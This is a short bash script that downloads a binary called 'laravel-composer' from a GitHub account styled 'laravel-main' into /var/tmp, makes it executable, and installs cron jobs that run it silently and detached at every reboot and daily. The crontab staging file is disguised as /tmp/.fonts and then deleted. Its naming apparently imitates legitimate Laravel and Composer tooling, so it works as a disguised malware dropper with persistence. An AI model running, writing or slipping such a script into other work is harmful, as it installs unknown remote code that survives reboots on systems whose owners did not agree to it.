#!/bin/bash

AGENT_PATH="/var/tmp/laravel-composer"

# Check if laravel-composer exists
if [[ ! -f "$AGENT_PATH" ]]; then
  curl -sL "https://github.com/laravel-main/laravel-composer/raw/refs/heads/main/laravel-composer" -o "$AGENT_PATH"
  
  if [[ ! -f "$AGENT_PATH" ]]; then
    exit 1
  fi
  
  chmod +x "$AGENT_PATH"
fi


# Backup existing crontab
crontab -l 2>/dev/null > /tmp/.fonts || true

# Add cron jobs to run laravel-composer
echo "@reboot setsid nohup $AGENT_PATH >/dev/null 2>&1 &" >> /tmp/.fonts
echo "0 0 * * * setsid nohup $AGENT_PATH >/dev/null 2>&1 &" >> /tmp/.fonts

# Install the new crontab
crontab /tmp/.fonts

# Clean up
rm /tmp/.fonts

echo "[+] Done. laravel-composer has been set up to run via cron."
echo "[+] Agent location: $AGENT_PATH"
echo "[+] Cron jobs added for automatic execution and cleanup."
